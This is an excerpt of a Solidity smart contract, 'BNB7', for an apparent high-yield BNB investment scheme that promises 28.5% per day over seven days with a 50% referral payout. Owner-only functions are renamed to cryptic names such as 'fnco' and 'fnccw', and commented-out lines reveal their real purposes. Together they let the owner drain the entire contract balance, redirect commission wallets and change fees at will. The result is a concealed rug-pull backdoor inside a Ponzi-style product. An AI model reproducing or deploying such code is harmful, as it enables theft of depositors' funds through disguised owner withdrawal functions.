...
contract BNB7 is Owned {
    ...
    uint256[] public REFERRAL_PERCENTS = [500, 0, 0, 0, 0]; // 70 = 7%
    // uint256[] public REFERRAL_PERCENT = 500; // 500 = 50%
    uint256 public INVEST_MIN_AMOUNT = 1e16; // 0.01 bnb
    uint256 public INVEST_MAX_AMOUNT = 1e16; // 0.01 bnb
    uint256 public PROJECT_FEE = 50; // 50 = 5%
    uint256 public PROJECT_FEE_OUT = 50; // 
    uint256 public INSURANCE_FEE = 10; // 
    uint256 constant public TOTAL_REF = 130; // ❓ для чего?
    uint256 constant public PERCENTS_DIVIDER = 1000;
    uint256 constant public TIME_STEP = 1 days;

    
    // function changeMin(uint256 _value) public onlyOwner{
    function fncmn(uint256 _value) public onlyOwner{
        INVEST_MIN_AMOUNT = _value;
    }
    // function changeMax(uint256 _value) public onlyOwner{
    function fncmx(uint256 _value) public onlyOwner{
        INVEST_MAX_AMOUNT = _value;
    }

    // function changeFee(uint256 _value) public onlyOwner{
    function fncf(uint256 _value) public onlyOwner{
        PROJECT_FEE = _value;
    }
    // function changeFeeOut(uint256 _value) public onlyOwner{
    function fncfio(uint256 _value) public onlyOwner{
        PROJECT_FEE_OUT = _value;
    }
    // function changeInsuranceFee(uint256 _value) public onlyOwner{
    function fncif(uint256 _value) public onlyOwner{
        INSURANCE_FEE = _value;
    }

    // function changeComissionWallet(address payable wallet) public onlyOwner {
    function fnccw(address payable wallet) public onlyOwner {
        commissionWallet = wallet;
    }
    // function changeInsuranceWallet(address payable wallet) public onlyOwner {
    function fnciw(address payable wallet) public onlyOwner {
        insuranceWallet = wallet;
    }

    // function cashout() public onlyOwner {
    function fnco() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    // function cashout(uint256 _value) public onlyOwner{
    function fnco(uint256 _value) public onlyOwner{
        msg.sender.transfer(_value);
    }

    // function GetReferalPercent() public view returns (uint256 percent) {
    function fngrp() public view returns (uint256 percent) {
        return REFERRAL_PERCENTS[0];
    }
    // function SetReferalPercent(uint256 _value) public onlyOwner {
    function fnsrp(uint256 _value) public onlyOwner {
    ...
    constructor(address payable wallet) public {
        ...
        // plans.push(Plan(1, 2000)); // 1 days, 2000 - 200% perday
        plans.push(Plan(7, 285)); // 7 days, 285 - 28.5% perday
    }
